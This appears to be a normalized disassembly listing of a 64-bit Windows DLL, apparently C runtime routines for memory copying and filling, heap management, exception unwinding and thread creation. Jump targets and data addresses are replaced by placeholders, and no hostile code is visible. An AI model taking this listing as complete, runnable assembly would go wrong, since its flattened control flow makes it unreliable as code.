sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_18001c7d4
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov ecx 0x19
call sub_18001e3f0
mov edx 0x1
xor ecx ecx
call sub_18001e3a8
add rsp 0x28
jmp sub_18001e368
call rax
sub_18001c80c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_18001e6e4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_18001e69c
mov [ rbx ] eax
sub_18001c84c
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_18001d820
test rax rax
je r-xdata
mov rcx rbx
call sub_18001e7ec
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_18001c458
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_18001c8f0
int3
or eax r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
call sub_18001c2e4
lea rcx [ sub_18002d9dc ]
mov [ rw-data ] rbx
call sub_18001d608
sub_18001c8f0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rbp - 0x40 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_18001c4a0
lea rdx [ rbp + 0x10 ]
mov rcx rdi
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x10 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rbp + 0x10 ] rax
mov [ rbp - 0x8 ] rax
test rdi rdi
je r-xdata
mov r8d [ rbp - 0x28 ]
mov edx [ rbp - 0x3c ]
mov ecx [ rbp - 0x40 ]
lea r9 [ rbp - 0x20 ]
call [ RaiseException@IAT ]
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rbp - 0x20 ]
test r11 r11
cmove eax ecx
mov [ rbp - 0x20 ] eax
mov [ rbp - 0x20 ] ecx
jmp r-xdata
sub_18001c984
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18001e820
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18001c9f0
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_18001cadc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_18001e9dc
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
dec edi
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_18001cc30
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_18001cadc
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_18001e9dc
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
dec edi
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_18001efec
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_18001ec0c
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_18001ccdc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_18001ec0c
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_18001ec0c
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_18001ec0c
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_18001ff6c
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_18001cd64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_18001ec0c
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_18001ec0c
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_18001ff6c
call sub_18001ec0c
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_18001ce08
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_18001ec0c
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_18001ce5c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rdi rdx
mov rcx rdi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_18001e9dc
mov esi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_1800203b8
test edx edx
je r-xdata
movsxd rcx [ rdi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp esi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp esi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rdi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
mov eax [ r8 ]
cmp eax r11d
cmove eax edx
mov [ r8 ] eax
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_18001cf88
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_18001ec0c
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_18001ec0c
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_18001ec0c
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001cfcc
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001ec0c
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_18001d000
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_18001ec0c
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_18001ec0c
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_1800203b8
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_1800203b8
call sub_18001ec0c
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18001d060
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x4b8 ]
sub rsp 0x5b8
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4a0 ] rax
mov rbx [ rbp + 0x520 ]
mov rdi [ rbp + 0x530 ]
mov r14 [ rbp + 0x538 ]
mov r13 rdx
mov r15 rcx
mov r12 r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rsi r9
call sub_18001c4a0
movsxd rax [ rbp + 0x528 ]
mov rdx [ r14 ]
mov rcx [ r15 ]
mov [ rsp + 0x68 ] rax
movzx eax [ rbp + 0x540 ]
lea r11 [ sub_18001f2b4 ]
lea r8 [ rsp + 0x30 ]
mov [ rbp - 0x78 ] rax
mov rax [ r14 + 0x40 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x30 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x78 ] rdi
mov [ rbp - 0x80 ] r13
mov [ rbp - 0x70 ] 0x19930520
call RtlUnwindEx
mov rcx [ rbp + 0x4a0 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x5b8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_18001d150
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_18001d434
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_18001ccdc
mov r8d eax
sub_18001d210
push rbx
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
lea r8 [ rsp + 0x40 ]
call sub_18002054c
mov rbx rax
test rax rax
jne r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
cmp [ rsp + 0x40 ] eax
je r-xdata
call sub_18001e6e4
test rax rax
je r-xdata
call sub_18001e6e4
mov ecx [ rsp + 0x40 ]
mov [ rax ] ecx
sub_18001d25c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi r8
mov rdi rdx
test r9 r9
jne r-xdata
test rcx rcx
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
je r-xdata
call sub_18001e6e4
mov ebx 0x16
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov r8 rdx
xor edx edx
call sub_18001c9f0
test rsi rsi
je r-xdata
cmp rdx rbx
jb r-xdata
cmp rdi rbx
jae r-xdata
mov r8 rbx
mov rdx rsi
call sub_18001c4a0
jmp r-xdata
mov eax 0x16
call sub_18001e6e4
mov ebx 0x22
jmp r-xdata
mov [ rax ] ebx
call sub_1800207e0
mov eax ebx
jmp r-xdata
sub_18001d2ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
test rbp rbp
jne r-xdata
and [ rbp ] 0x0
test rax rax
jne r-xdata
call sub_18001e6e4
mov ebx 0x16
mov [ rax ] ebx
call sub_1800207e0
mov eax ebx
jmp r-xdata
mov edx 0x4
mov rcx rbp
call rdi
test eax eax
jne r-xdata
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
xor eax eax
call sub_18001e6e4
mov [ rax ] 0xc
call sub_18001e6e4
mov eax [ rax ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
jne r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
mov rbx rax
call EncodePointer
xchg [ rw-data ] rbx
cmp rbx rax
je r-xdata
call sub_18001e6e4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_18001e69c
mov [ rbx ] eax
call sub_1800207e0
call [ GetLastError@IAT ]
mov ecx eax
call sub_18001e69c
jmp r-xdata
mov rcx rsi
call [ FreeLibrary@IAT ]
sub_18001d434
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_18001d1f0
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_18001d4b8
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_180020880
mov rcx rax
mov rbx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18001d4fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_180020aa4
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov r12 rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_180020a14
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call [ EncodePointer@IAT ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_180020ab0
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_180020904
xor ebx ebx
test rax rax
jne r-xdata
mov rcx r12
call sub_180020904
test rax rax
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_18001d644
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_18001e6e4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10w
je r-xdata
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
add rcx 0x2
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10w
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_18001e6e4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_1800207e0
mov eax ebx
sub_18001d6cc
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_18001e6e4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
sub rcx r8
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_18001e6e4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_1800207e0
mov eax ebx
sub_18001d738
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
and [ rax - 0x38 ] 0x0
mov rbx rdx
xor edx edx
mov rdi r8
mov rbp rcx
lea r8d [ rdx + 0x28 ]
lea rcx [ rax - 0x30 ]
mov rsi r9
call sub_18001c9f0
test rbx rbx
jne r-xdata
test rdi rdi
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
or eax 0xffffffff
jmp r-xdata
mov rcx rbx
call sub_180021b14
mov [ rsp + 0x38 ] 0x49
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x20 ] rbx
cmp rax 0x3fffffff
jbe r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
add eax eax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x28 ] 0x7fffffff
jmp r-xdata
mov r9 [ rsp + 0x80 ]
lea rcx [ rsp + 0x20 ]
mov r8 rsi
mov rdx rdi
call rbp
sub_18001d7e8
mov r11 rsp
mov [ r11 + 0x10 ] rdx
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
mov r8 rdx
lea rax [ r11 + 0x18 ]
mov rdx rcx
lea rcx [ sub_180021c1c ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_18001d738
add rsp 0x38
retn
sub_18001d820
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_18001e7ec
call sub_18001e6e4
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_18001e650
mov ecx 0x1e
call sub_18001e3f0
mov ecx 0xff
call sub_180020a8c
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_18001e6e4
mov [ rax ] 0xc
mov rcx rbx
call sub_18001e7ec
test eax eax
je r-xdata
call sub_18001e6e4
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_18001d928
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001ea9c
call sub_18001ea94
mov ecx eax
call FlsGetValue
mov r11 rax
test rax rax
jne r-xdata
mov rax [ rbx + 0x90 ]
mov rcx rbx
mov [ r11 + 0x90 ] rax
mov rax [ rbx + 0x98 ]
mov [ r11 + 0x98 ] rax
mov rax [ rbx + 0x8 ]
mov [ r11 + 0x8 ] rax
call sub_18001ec30
call sub_18001ea94
mov rdx rbx
mov ecx eax
call FlsSetValue
test eax eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call [ ExitThread@IAT ]
call sub_18001d8fc
sub_18001d9a8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
xor ebx ebx
mov rbp r9
mov rsi r8
mov r12d edx
mov r13 rcx
test r8 r8
jne r-xdata
call sub_18001ea9c
mov edx 0x2c8
mov ecx 0x1
call sub_180020880
mov rdi rax
test rax rax
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
jmp r-xdata
mov rcx rdi
call sub_18001c80c
test ebx ebx
je r-xdata
call sub_18001ec0c
mov rcx rdi
mov rdx [ rax + 0xc0 ]
call sub_18001ead0
mov rcx [ rsp + 0x78 ]
or [ rdi + 0x8 ] 0xffffffffffffffff
mov eax [ rsp + 0x70 ]
test rcx rcx
lea r8 [ rsp + 0x60 ]
cmovne r8 rcx
mov rdx r12
mov r9 rdi
mov [ rsp + 0x28 ] r8
lea r8 [ sub_18001d928 ]
mov rcx r13
mov [ rdi + 0x90 ] rsi
mov [ rdi + 0x98 ] rbp
mov [ rsp + 0x20 ] eax
call [ CreateThread@IAT ]
test rax rax
jne r-xdata
xor eax eax
mov ecx ebx
call sub_18001e724
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
call [ GetLastError@IAT ]
mov ebx eax
sub_18001da9c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_18001d820
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_18001c80c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_18001e7ec
call sub_18001e6e4
